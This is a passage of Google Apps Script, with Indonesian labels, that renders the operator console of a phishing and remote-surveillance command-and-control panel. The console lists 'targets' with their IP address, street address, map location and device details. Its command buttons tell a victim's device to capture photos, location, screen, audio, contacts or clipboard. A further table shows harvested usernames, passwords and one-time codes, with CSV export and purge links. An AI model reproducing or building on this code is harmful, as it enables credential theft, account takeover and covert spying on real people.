  + '<p><a href="?key=' + SECRET_KEY + '" style="color:#7fb2e8">kembali</a> &middot; '
  + '<a href="?key=' + SECRET_KEY + '&export=1" style="color:#7fb2e8">ekspor manifest</a></p></body></html>';
  return body;
}

/* ---------------- KONSOL ---------------- */
function console() {
  var ses = sessions(), k = SECRET_KEY, tz = Session.getScriptTimeZone();
  var sh = getSheet_(SHEET_LOG), l = sh.getLastRow();
  var log = l > 1 ? sh.getRange(2,1,l-1,24).getValues().reverse() : [];
  function esc(v) { return String(v == null ? '' : v).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
  var MODS = [['foto','foto'],['lokasi','lokasi'],['tangkap','tangkap'],['layar','layar'],['audio','audio'],['pindai','pindai'],
    ['sidik','sidik'],['media','media'],['sensor','sensor'],['perangkat','perangkat'],['getar','getar'],['senter','senter'],
    ['bangun','bangun'],['notif','notif'],['salin','salin'],['bicara','bicara'],['bagikan','bagikan'],['buka','buka'],['kontak','kontak'],['kill','kill']];

  var cards = ses.map(function (s) {
    var d = dossier(s.sid) || {}, mt = metrics(s.sid);
    var ago = typeof s.last === 'number' ? Math.round((Date.now() - s.last) / 1000) : -1;
    var live = ago >= 0 && ago < 120;
    var map = (d.LAT && d.LNG) ? 'https://www.google.com/maps?q=' + esc(d.LAT) + ',' + esc(d.LNG) : '';
    var btns = MODS.map(function (m) {
      var g = ['bagikan','kontak','salin','bicara','tangkap','buka'].indexOf(m[0]) > -1;
      return '<a class="btn' + (g ? ' g' : '') + '" href="?key=' + k + '&sid=' + encodeURIComponent(s.sid) + '&cmd=' + m[1] + '">' + m[0] + '</a>';
    }).join('');
    var feed = feedOf(s.sid).map(function (r) {
      var b;
      if (r.isi.indexOf('data:image/') === 0) b = '<img class="shot" src="' + r.isi + '" onclick="big(this)">';
      else if (/^https:\/\/drive/.test(r.isi)) b = '<a href="' + esc(r.isi) + '" target="_blank">lampiran</a>';
      else if (r.isi.length > 3) b = '<code>' + esc(r.isi).slice(0, 700) + '</code>';
      else b = '<span class="mut">' + esc(r.isi) + '</span>';
      return '<div class="ev"><span class="tag">' + esc(r.arah === 'task' ? r.cmd : r.arah) + '</span>'
        + '<span class="mut">' + esc(r.t instanceof Date ? Utilities.formatDate(r.t, tz, 'HH:mm:ss') : r.t) + '</span> ' + b + '</div>';
    }).join('');

    return '<div class="card' + (live ? ' live' : '') + '"><div class="hd"><b>' + esc(s.sid) + '</b>'
      + (live ? '<span class="dot"></span>' : '')
      + '<span class="mut">' + s.n + ' paket &middot; ' + (ago >= 0 ? ago + 's' : '-') + ' &middot; SGR ' + mt.sgr + ' &middot; PAR ' + mt.par + ' &middot; ALH ' + mt.alh + 'ms &middot; LSR ' + mt.lsr + '</span></div>'
      + '<table class="dos"><tr><th>IP</th><td>' + esc(d.IP || '-') + (map ? ' <a href="' + map + '" target="_blank">peta</a>' : '') + '</td></tr>'
      + '<tr><th>Kota</th><td>' + esc(d.KOTA || '-') + ' / ' + esc(d.ISP || '-') + '</td></tr>'
      + '<tr><th>Alamat</th><td>' + esc(String(d.ALAMAT || '-').slice(0, 130)) + '</td></tr>'
      + '<tr><th>Model</th><td>' + esc(d.MODEL || '-') + ' &middot; ' + esc(d.OS || '-') + '</td></tr>'
      + '<tr><th>Konteks</th><td>' + esc(d.KONTEKS || '-') + '</td></tr>'
      + '<tr><th>Matriks</th><td class="sm">senyap ' + mt.sil + ' / prompt ' + mt.pro + ' / blokir ' + mt.blo + ' / n-a ' + mt.uns + ' dari ' + mt.total + '</td></tr>'
      + '<tr><th>Probe</th><td class="sm">' + esc(String(d.PROBE || '-').slice(0, 300)) + '</td></tr></table>'
      + '<div class="btns">' + btns + '</div><div class="feed">' + (feed || '<span class="mut">-</span>') + '</div></div>';
  }).join('');

  var rows = log.map(function (r, i) {
    var fid = String(r[13] || ''), f = String(r[12] || '');
    var pic = fid ? '<img class="shot" src="https://drive.google.com/thumbnail?id=' + esc(fid) + '&sz=w200" onclick="big(this)">'
      : (f.indexOf('data:') === 0 ? '<img class="shot" src="' + f + '" onclick="big(this)">' : '-');
    return '<tr><td>' + (log.length - i) + '</td><td class="mut">' + esc(r[0] instanceof Date ? Utilities.formatDate(r[0], tz, 'dd/MM HH:mm') : r[0]) + '</td>'
      + '<td><b>' + esc(r[1]) + '</b></td><td><code class="pw">' + esc(r[2]) + '</code></td>'
      + '<td class="otp" data-c="' + esc(String(r[10]).replace(/\D/g,'')) + '" onclick="cp(this)">' + (String(r[10]).replace(/\D/g,'') || '-') + '</td>'
      + '<td>' + pic + '</td><td class="sm">' + esc(String(r[17] || '').slice(0, 70)) + '</td><td class="sm">' + esc(r[18] || '-') + '</td></tr>';
  }).join('');

  return '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>MOC</title><style>'
  + 'body{font-family:ui-monospace,Menlo,monospace;margin:0;padding:14px;background:#0a1120;color:#c2d0e0;font-size:12px}'
  + 'h1{font-size:14px;color:#e6eef8;margin:0 0 10px}h2{font-size:11px;color:#8fa8c4;margin:16px 0 8px;text-transform:uppercase}'
  + '.bar{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px}.bar a,.btn{background:#141f34;border:1px solid #22334d;color:#9fb6d1;padding:4px 9px;border-radius:5px;text-decoration:none;font-size:10.5px}'
  + '.bar a:hover,.btn:hover{background:#1d2c47}.btn.g{border-color:#3d5a2b;color:#b6d99a}.bar a.r{color:#f3a3a3;border-color:#5a2b2b}'
  + '.mut{color:#61748a;font-size:10px}.card{background:#0f1929;border:1px solid #1c2a41;border-radius:8px;padding:10px;margin-bottom:10px}.card.live{border-color:#1e5c3a}'
  + '.hd{display:flex;align-items:center;gap:8px;margin-bottom:6px;flex-wrap:wrap}.hd b{color:#8fe3b4;font-size:11px}'
  + '.dot{width:7px;height:7px;border-radius:50%;background:#22c55e;box-shadow:0 0 6px #22c55e}'
  + 'table.dos{width:100%;border-collapse:collapse}table.dos th{width:76px;text-align:left;color:#5f7488;font-weight:400;font-size:10px;vertical-align:top;padding:1px 0}'
  + 'table.dos td{font-size:10.5px;color:#9fb2c6;padding:1px 0;word-break:break-all}table.dos a{color:#7fb2e8}'
  + '.btns{display:flex;gap:4px;flex-wrap:wrap;margin:8px 0}.feed{max-height:200px;overflow:auto;border-top:1px solid #182440;padding-top:5px}'
  + '.ev{padding:2px 0;border-bottom:1px dashed #16223a;word-break:break-all}.ev code{color:#9ec1e6;font-size:10px;white-space:pre-wrap}'
  + '.tag{display:inline-block;padding:0 5px;border-radius:3px;font-size:9px;background:#1c2b45;color:#8fb0d6;margin-right:5px}'
  + '.shot{width:64px;height:64px;object-fit:cover;border-radius:5px;cursor:zoom-in;border:1px solid #22334d}'
  + 'table.log{width:100%;border-collapse:collapse;background:#0f1929;border-radius:8px;overflow:hidden;font-size:11px}'
  + 'table.log th{background:#141f34;padding:5px;text-align:left;font-size:9px;color:#7f95ad;text-transform:uppercase}'
  + 'table.log td{padding:5px;border-top:1px solid #16223a;vertical-align:top}'
  + 'code.pw{background:#2a2412;color:#f3d97b;padding:1px 5px;border-radius:3px}td.otp{color:#6ee7a0;font-weight:700;cursor:pointer}td.sm{color:#7f95ad;font-size:10px}'
  + '.ov{position:fixed;inset:0;background:rgba(0,0,0,.93);display:flex;align-items:center;justify-content:center;z-index:9;cursor:zoom-out}.ov img{max-width:94vw;max-height:90vh}'
  + '</style></head><body><h1>MOC &middot; zgch-d8 &middot; ' + ses.length + ' target</h1>'
  + '<div class="bar"><a href="?key=' + k + '">muat ulang</a><a href="?key=' + k + '&report=1">laporan</a>'
  + '<a href="?key=' + k + '&export=1">manifest</a>'
  + '<a href="?key=' + k + '&csv=1">csv login</a><a href="?key=' + k + '&csv2=1">csv c2</a><a href="?key=' + k + '&csv3=1">csv matriks</a>'
  + '<a href="' + getSs().getUrl() + '" target="_blank">sheet</a>'
  + '<a class="r" href="?key=' + k + '&clear=1" onclick="return confirm(\'Purge?\')">purge</a></div>'
  + '<h2>Target</h2>' + (cards || '<span class="mut">belum ada</span>')
  + '<h2>Kredensial</h2><table class="log"><thead><tr><th>#</th><th>Waktu</th><th>User</th><th>Sandi</th><th>OTP</th><th>Foto</th><th>Alamat</th><th>IP</th></tr></thead><tbody>'
  + (rows || '<tr><td colspan="8" class="mut">kosong</td></tr>') + '</tbody></table>'
  + '<script>function big(i){var d=document.createElement("div");d.className="ov";var m=document.createElement("img");m.src=i.src;d.appendChild(m);d.onclick=function(){d.remove()};document.body.appendChild(d)}'
  + 'function cp(e){var t=e.getAttribute("data-c");if(t){try{navigator.clipboard.writeText(t)}catch(x){}e.style.color="#fff";setTimeout(function(){e.style.color=""},600)}}'
  + 'setTimeout(function(){location.reload()},12000)</script></body></html>';
}